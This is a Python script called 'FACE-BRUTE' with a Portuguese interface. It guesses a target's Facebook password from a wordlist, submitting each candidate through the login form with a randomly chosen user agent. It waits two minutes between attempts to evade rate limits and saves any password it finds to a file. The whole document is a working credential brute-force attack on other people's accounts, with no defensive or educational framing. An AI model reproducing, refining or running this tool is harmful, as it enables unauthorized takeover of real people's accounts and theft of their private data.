#!/usr/bin/python3
# -*- coding: utf-8 -*-

import mechanize
import os
import random
import time
cont = 0

try:
   
    random_agent = random.choice(['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.104 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.2; ARM; Trident/7.0; Touch; rv:11.0; WPDesktop; Lumia 730 Dual SIM) like Gecko',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 6.0.1; SM-J500M Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/122.0.0.10.69;]',
    'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; Microsoft; RM-1068) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537',
    'Mozilla/5.0 (Linux; Android 7.0; Moto G (5) Build/NPPS25.137-33-6; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/122.0.0.10.69;]',
    'Mozilla/5.0 (Linux; Android 4.4.4; SM-T116BU Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Safari/537.36 [FB_IAB/MESSENGER;FBAV/123.0.0.11.70;]',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 [FBAN/FBIOS;FBAV/98.0.0.48.70;FBBV/62465497;FBDV/iPhone6,1;FBMD/iPhone;FBSN/iOS;FBSV/10.3.2;FBSS/2;FBCR/VIVO;FBID/phone;FBLC/pt_BR;FBOP/5;FB',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G36 [FBAN/MessengerForiOS;FBAV/124.0.0.50.70;FBBV/63293619;FBDV/iPhone4,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.5;FBSS/2;FBCR/VIVO;FBID/phone;FBLC'])
   
    print("====================")
    print("=====\033[34mFACE-BRUTE\033[m=====")
    print("modificado por: \033[34mAstaroth Ariel\033[m")
    print("====================")
    login = raw_input("Email ou ID: ")
    wordlist = raw_input("Digite o nome da sua wordlist: ")
    
    try:
        wordlist = open(wordlist, "r")
        ler = wordlist.readlines()
    except IOError:
        print("\033[31mOps... Não foi possivel selecionar a wordlist, por favor tente novamente\033[m")
        
    os.system("clear")
    print("\033[31mATENÇÃO:\033[m Cada senha da wordlist será testada a cada 2 minutos")
    try:
        for senhas in ler:
            cont = cont + 1
            conect = mechanize.Browser()
            conect.set_handle_robots(False)
            conect.open('https://facebook.com/')
            conect.addheaders=[('User-Agent',random_agent)]
            conect.select_form(nr=0)
            conect.form['email'] = login
            conect.form['pass'] = senhas
            conect.submit()
            verifica = conect.title().lower()
            print("==========================")
            print("Tentativa: {}".format(cont))
            if verifica == 'facebook':
                
                print("SENHA ENCONTRADA ===> \033[32m{}\033[m".format(senhas))
                print("Login: {}\nSenha: \033[32m{}\033[m".format(login, senhas))
                
                salvar = raw_input("\nDeseja salvar o login e senha? S/N: ")
                if salvar == "s" or salvar == "S":
                    arq = open("senhas_fb.txt", "a")
                    arq.write("Login: {}\nSenha: {}\n=====================\n".format(login, senhas))
                    arq.close()
                    print("Salvo como senhas_fb.txt")
                else:
                    print("Opção inválida, ocorreu um erro ao salvar o arquivo")
                raise SystemExit
            else:
                print("SENHA INCORRETA ===> \033[31m{}\033[m".format(senhas))
                time.sleep(120) # dois minutos de espera
                
    except NameError:
        pass
except KeyboardInterrupt:
    print("\nObrigado por usar o programa!")

